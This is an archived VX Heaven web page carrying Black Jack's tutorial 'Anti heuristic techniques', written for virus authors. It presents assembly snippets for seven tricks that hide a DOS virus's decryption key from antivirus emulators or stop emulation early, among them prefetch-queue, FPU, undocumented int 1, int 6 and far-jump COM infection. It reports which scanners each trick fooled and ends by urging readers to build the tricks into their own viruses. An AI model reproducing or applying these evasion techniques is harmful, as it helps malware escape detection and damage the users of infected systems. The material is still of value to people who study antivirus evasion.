@@ -1,0 +1,267 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Black Jack 'Anti heuristic techniques' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Black Jack"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Black Jack,Anti heuristic techniques, tricks, stack, trick, clear, number, loop, instructions, point, virus, good, file, version, heuristic, values, prefetch"/>
+<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"3934cb2b19a7c1bb6a15322a2edc35918f66355a-1498755508-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vbj01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Anti heuristic techniques</h1><p><a href="/lib/?lang=en&amp;author=Black%20Jack"> Black Jack</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vbj01.html';</script><div class="ci"><a href="/lib/?ci=vbj01">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=AA#vbj01">Back to index</a>] [<a href="/lib/vbj01.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#pi">Introducion</a></li>
+<li><a href="#pk">Know your enemies!</a></li>
+<li><a href="#pm">THE MAIN IDEA</a></li>
+<li><a href="#p1">1. THE "INVERTED" PREFETCH QUEUE TRICK</a></li>
+<li><a href="#p2">2. THE FPU TRICK</a></li>
+<li><a href="#p3">3. THE INT 1 TRICK</a></li>
+<li><a href="#p4">4. THE INT 6 TRICK</a></li>
+<li><a href="#p5">5. INFECT COM FILES WITH A FAR JUMP</a></li>
+<li><a href="#p6">6. INITIAL REGISTER VALUES</a></li>
+<li><a href="#p7">7. "ENDLESS" LOOPS</a></li>
+<li><a href="#pf">FINAL NOTES</a></li>
+</ul>
+<h2><a name="pi"></a>Introducion</h2>
+<p>In the early days of computer virii it was sufficient for AV programs to search for a set of virus patterns. But the number of virii increased more and more rapidly, and so the AV people invented something called heuristics to make our job harder. Heuristic scanners emulate the code of every program they scan in a so-called "virtual machine" and search for virus-like actions. So it should be *theoretically* possible to find every new virus. Theoretically, because of course these code analysers can't emulate the "real" CPU to 100%, and so not every virus gets actually cought. So in my humble opinion, it is the damn duty of us, the VX community, to search for the flaws in these heuristic engines and exploit them for our own goals. What I'm talking of are tricks to fool these engines, to make our newest creations invisible to those evil programs which want to find&amp;kill our babies to. This is in my opinion one of the most interesting fields in virus programming (it's always a great feeling to outsmarten your enemies ;-) ). Here are the results of the research I've done into this topic in the last time.</p>
+<h2><a name="pk"></a>Know your enemies!</h2>
+<p>If you want to make your virii anti-heuristic, the first thing you need are heuristic scanners to test your creations with. I recommend you to get as many as them as possible, because every one has different storng points and flaws. I'll give you a short list of scanners I use/test and where to get them:</p>
+<ul>
+<li>Thunderbyte Antivirus (http://www.thunderbyte.com): In the earlier days this was considered one of the best scanners, but nowadays it is considered quite weak by most VXers, at least its "heuristics" (it's actually based on little scanstrings). But on the other hand it comes with a lot of other AV utilities beside the scanner (checksummer, cleaner, memory resident utilities...). A lot of stuff to work around for those of you who are interested in retro structures, but this is a different story... By the way, I would recommend you to get version 7.xx besides the actual one, because this version allows you to make your own scanstrings. Can be quite important if you accidentally infect yourself...</li>
+<li>F-prot (http://www.datafellows.com): Isn't too bad, although there are a lot of better ones. The interesting thing about it is that the last versions had much better heuristics than the current ones. So I recommend you to get yourself somewhere a copy of v2.28 or something like that (I use v2.27), and to test your virus with both versions. Another interesting feature of this scannner is its /PARANOID command line parameter. If you use it, the scanner goes into a highly sensible mode (with a lot of false positives). For that reason it isn't really necessarry to beat even f-prot/paranoid, but if you do so, you know that your anti-heuristic tricks are <em>really</em> good.</li>
+<li> AVP (http://www.avp.ch): In my opinion the best heuristic scanner, really hard to fool. I used version 3.0 build 128</li>
+<li> NOD (http://www.eset.sk): Nearly as good as AVP</li>
+<li> Dr. Web (http://www.dials.ru): Also a very good one. Those russians know how to make good AVs...</li>
+<li> Dr Solomon's (http://www.drsolomon.com): A mid quality scanner from our friends at NAI, but still better than McAfee (<em>duh</em>)</li>
+<li> Ikarus Antivirus (http://www.ikarus.at): A product of middle quality, I just use it because of patriotic reasons.</li>
+</ul>
+<h2><a name="pm"></a>THE MAIN IDEA</h2>
+<p>All my tricks I am going to present to you are based on the same idea: The virus is encrypted, and you try to stop the code emulation before the scanner can decrypt the main virus body, or you hide the decryption key from the scanner. If you haven't worked with encryption yet, the key-hiding tricks may also work if you "encrypt" the registers (for example the function values for int 21h), although I haven't tested this. For example use for opening a file:</p>
+<pre class="source">
+mov ax, 3D02h-key
+add ax, key
+int 21h
+</pre>
+<h2><a name="p1"></a>1. THE "INVERTED" PREFETCH QUEUE TRICK</h2>
+<p>Older Processors, like the 386 or the 486 used something called the prefetch instruction queue (PIQ) to speed up the code execution. The idea behind this is that WHILE the CPU processes one instruction, the following instructions are already read into a CPU-internal buffer. Therefore a change in the code that follows the actual processed instruction has no effect! let's look at an example for this:</p>
+<pre class="source">
+mov word ptr cs:[offset piq], 20CDh
+piq:
+nop
+nop
+</pre>
+<p>You should think that the program terminates, because the two nops have been overwritten with an int 20h, but on a 386 or 486 this isn't the case, because the nops are already in the cpu! But on a Pentium/Pentium II the code will actually be overwritten and the program quits.</p>
+<p>If you want to use this as an anti heuristic trick, you must know that this was a widely used against heuristic scanners in the days of the 386/486. But then the AVs improved and now they emulate the prefetch queue. Isn't that strange? They emulate something that isn't there anymore on modern processors! And this is what we use against them! Let's look at the example above again: on a pentium or a higher cpu the program will, as I already said, terminate, because those processors have no PIQ, but most AVs will think the code goes on with the two nops because of the PIQ. So here's what we'll do:</p>
+<pre class="source">
+	mov word ptr [offset prefetch], 06C7h
+prefetch:
+	int 20h
+	dw offset decrypt_key
+	dw key
+</pre>
+<p>the int 20h will be overwritten, and instead there will be the instruction:</p>
+<pre class="source">
+mov word ptr [decrypt_key], key
+</pre>
+<p>The AVs will think the program terminates because of the PIQ, but actually the program execution goes on with the setting of the decryption key in our decryption rotine. We only have one problem: this code will only work on Pentiums and upwards. To make it compatible with 486ers and below we'll have to clear the PIQ between the two instructions. Nothing more simple than that! You must also know that all jump instructions (jmp, call, loop, int...) clear the PIQ (quite necessary, if you think of it). But we can't simply place a JMP Short $+2 between the instructions, as it is used normally to clear the PIQ, because this would also be noticed by code emulators. But we can use a special feature of our CPU, the trap flat. If this flag is set, the CPU will call int 1 after every instruction, and remember, an int clears the PIQ. This is normally only used by debuggers, so the int 1 vector points to a simple IRET in the normal case, so we can use that without any problems. But anyhow, it's a good idea to clear the trap flag again afterwards. Here's the complete code that will run on any processor (assumes DS=CS):</p>
+<pre class="source">
+pushf                                   ;flags on the stack
+pop ax                                  ;flags from stack into AX
+or ax, 100000000b                       ;set trap flag
+push ax                                 ;put the modified flags in AX back...
+popf                                    ;into the flag register via the stack
+	
+mov word ptr [offset prefetch], 06C7h   ;modify the following instruction
+prefetch:                               ;here gets int1 called => clears PIQ
+int 20h                                 ;This is never executed
+dw offset decrypt_key                   ;where we want to write our key to
+dw key                                  ;the actual decryption key
+
+pushf                                   ;clear the trap flag again with
+pop ax                                  ;the same method as above.
+xor ax, 100000000b                      ;will also fool some debuggers
+push ax
+popf
+
+mov word ptr [offset prefetch], 20CDh   ;restore the int20h (next generations)
+</pre>
+<p>This trick fooled AVP, Dr. Web, f-prot v3.04 (even with the /PARANOID flag), but not f-prot v2.27, Nod, Ikarus and Dr. Solomon's. f-prot v2.27 and Ikarus, on the other hand were fooled by the "normal" PIQ trick (which doesn't run on modern processors, you remember).</p>
+<h2><a name="p2"></a>2. THE FPU TRICK</h2>
+<p>My favourite trick, because it is very simple but nevertheless the most effective one. It fools *ALL* tested scanners!!! The only thing you must know is that heuristic scanners don't emulate floating point instructions. Obviously AVs think that FPU instructions aren't used in virii anyhow. Let's prove they are wrong! Here's what we do: After encryption we convert the crypt key to a floating point number. To decrypt we'll have to convert it back to an integer:</p>
+<pre class="source">
+; AFTER ENCRYPTION:
+mov decrypt_key, key                    ;save key into integer variable
+fild decrypt_key                        ;load integer key into FPU and store
+fstp decrypt_float_key                  ;it back as floating point number
+mov decrypt_key, 0                      ;destroy the key (very important!)
+
+; BEFORE DECRYPTION:
+fld decrypt_float_key                   ;load the key as floating point number
+fistp decrypt_key                       ;into the FPU and store it back as int
+</pre>
+<p>As I said before, this trick is very easy and extremely effective, but if you use it, please consider that it has "high system requirements": If your virus is run on a machine without a FPU (386, 486SX), it will crash.</p>
+<h2><a name="p3"></a>3. THE INT 1 TRICK</h2>
+<p>As I wrote before, int 1 is called after each instruction by the CPU if the trap flag is set. But of course you can also call interrupt 1 manually with the int command. This is generally assembled to 0CDh/001h. And this is quite strange, since there is a special opcode for int1 (0F1h), although this isn't documented. But "not documented" means also "not emulated by AVs", <em>grin</em>. So here's what we'll do: We set an own int 1 handler, which returns the decryption key and call it with the undocumented opcode, and AVs will have no idea what the decryption key is:</p>
+<pre class="source">
+mov ax, 3501h                   ;get int vector 1, so we can restore it later
+int 21h                         ;not really necessary, but a little bit saver
+mov int1_segm, es
+mov int1_offs, bx
+
+mov ax, 2501h                   ;set int vector 1 to our own routine
+mov dx, offset int1_handler     ;we assume DS=CS
+int 21h
+
+db 0F1h                         ;this will call our int 1 handler, which
+mov decrypt_key, ax             ;returns the decryption key
+
+mov ax, 2501h                   ;restore the original int 1 handler
+mov dx, cs:int1_offs
+mov ds, cs:int1_segm
+int 21h
+
+[...]
+
+int1_handler:
+mov ax, key
+iret
+</pre>
+<p>Another funny thing you can do with this trick is simulate to quit the program. So here's what you do:</p>
+<pre class="source">
+[...]
+
+db 0F1h                         ;calls our int 1 handler (see above);
+mov ax, 4c00h                   ;quit program
+int 21h                         ;but... this code is never reached... ;-)
+
+[...]
+
+int1_handler:
+mov bx, sp                      ;modify return address, so the quit command
+add word ptr ss:[bx], 5         ;is never executed.
+iret
+</pre>
+<p>This is also a very powerful trick. In my tests only f-prot v2.27 /PARANOID detected it. One disadvandace is, though, that it will only work on intel CPUs. On Cyrix or AMD processors, this nice undocumented opcode is not there, so your virus will crash on them. :-( If you want to see it in a full virus, feel free to take a look at my PR.H! virus.</p>
+<h2><a name="p4"></a>4. THE INT 6 TRICK</h2>
+<p>Interrupt 6 is always called by the CPU if it finds an illegal instruction. We can use this in a way very similar to the int 1 trick: We set an int 6 handler, which returns our decryption key, and then we call it with an invalid instruction. But we have to consider one thing: the return offset in the int 6 handler will point to the invalid opcode, so we'll have to modify the return offset if we don't want to get in an endless loop.</p>
+<pre class="source">
+mov ax, 3506h                   ;get int vector 6, so we can restore it later
+int 21h                         ;not really necessary, but a little bit saver
+mov int6_segm, es
+mov int6_offs, bx
+
+mov ax, 2506h                   ;set int vector 6 to our own routine
+mov dx, offset int6_handler
+int 21h
+
+dw 0FFFFh                       ;an invalid opcode, will call our int 6
+mov decrypt_key, ax             ;handler, which returns the decryption key
+
+mov ax, 2506h                   ;restore the original int 6 handler
+mov dx, cs:int6_offs
+mov ds, cs:int6_segm
+int 21h
+
+[...]
+
+int6_handler:
+mov ax, key
+mov bx, sp
+add word ptr ss:[bx], 2         ;modify return address - very important!
+				;2 is the size of our invalid opcode.
+iret
+</pre>
+<p>Please note that this won't work in a windows dos-window, since windows gets control first in the case of an invalid opcode and terminates the program with an error message (thanks to Z0MBiE for that tip). So if you want to make your DOS file virii windows compatible, DON'T use this trick!!! In boot sector virii it should work fine, though.</p>
+<h2><a name="p5"></a>5. INFECT COM FILES WITH A FAR JUMP</h2>
+<p>I don't like delta offsets, and so I tried out one day to infect com files with a far jump at the beginning (plus some code to relocate it, of course):</p>
+<pre class="source">
+mov ax, cs                      ;Relocate far Jump
+add [offset com_seg], ax
+JMP SHORT $+2                   ;Clear prefetch queue
+db 0EAh                         ;OP-Code far Jump
+dw offset start                 ;Offset
+com_seg dw 0                    ;Segment (length of com file in paragraphs)
+				;pad filesize to even paragraph!
+</pre>
+<p>It worked perfectly, and to my pleasant surprise I found out that this way of infection prevents AVP and TBSCAN from saying the file is infected. To see it in full context, have a look at my PR.H!-virus again.</p>
+<h2><a name="p6"></a>6. INITIAL REGISTER VALUES</h2>
+<p>In most DOS versions the registers carry the same value at the start of a program:</p>
+<pre class="source">
+AX=BX=0000h (if the first/second command line parameter contain a illegal
+drive letter, AL/AH are set to 0FFh)
+CX=00FFh
+DX=DS=ES=PSP segment address
+SI=IP
+DI=SP
+BP=91Ch/912h depending on DOS/Windows version.
+</pre>
+<p>If you know that, you can use this values for encryption - many AVs don't emulate these values correctly, since most of them are undocumented. For example I used 91h (BP shr 4) in my tests to encrypt/decrypt the virus body. It fooled TBAV, DrWeb, f-prot v2.27 and Ikarus - well, but not the better ones like AVP and NOD. Of course you can also use other register values than BP, save your encryption key in the stack pointer of the EXE header, for example, then set up the correct stack in the beginning and decrypt using DI. Or you encrypt with not and decrypt with xor cl. Just be creative. But please remember that this is undocumented and not the same in all DOS versions. FreeDOS, for example, sets all general registers to zero in the beginning, so if you use this trick, be prepared that your virus will crash under those enviroments. Also, you'll have to combine this trick with other ones to fool all AVs, since it is not too powerful, as I already stated before. For this reasons, this trick is not one of my favourite ones. But anyhow, thanks go to bfr0vrfl0 for inspiration to that trick.</p>
+<h2><a name="p7"></a>7. "ENDLESS" LOOPS</h2>
+<p>This is a very old trick, and unlike all other tricks presented in this article it wasn't found out by myself. But when I tried it out, I was very surprised to find that it still works so good. It fools Thunderbyte, Dr. Web and Ikarus. The idea is that these heuristic scanners only emulate the first instructions and then stop to speed up scanning. So we put a very long loop in the beginning of our virus, this is the "classic" form:</p>
+<pre class="source">
+mov cx, 0FFFFh
+loop_head:
+jmp short over_it
+mov ax, 4C00h                   ;actually this isn't needet, but it's the
+int 21h                         ;"classic" implementation of this trick.
+over_it:
+loop loop_head
+</pre>
+<p>You can also use different loop types, or you use, like in Opic's Odessa-B virus, very long decryption loops.</p>
+<h2><a name="pf"></a>FINAL NOTES</h2>
+<p>All this tricks presented here worked at the date of release of this document. It is of course possible that AVs mend out some flaws and some of these tricks won't work in the future anymore. Anyways, feel free to include this tricks in your own virii! Make them as undetectable as hell! Let's show those stupid AV dickheads how slobby their "protection" is!</p>
+[<a style="" href="/lib/?lang=EN&amp;index=AA#vbj01">Back to index</a>] [<a href="/lib/vbj01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vbj01">de</a><a href="/lib/index.php?lang=en&amp;id=vbj01">en</a><a href="/lib/index.php?lang=es&amp;id=vbj01">es</a><a href="/lib/index.php?lang=it&amp;id=vbj01">it</a><a href="/lib/index.php?lang=fr&amp;id=vbj01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vbj01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vbj01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vbj01">ua</a></div>
+</body>
+</html>
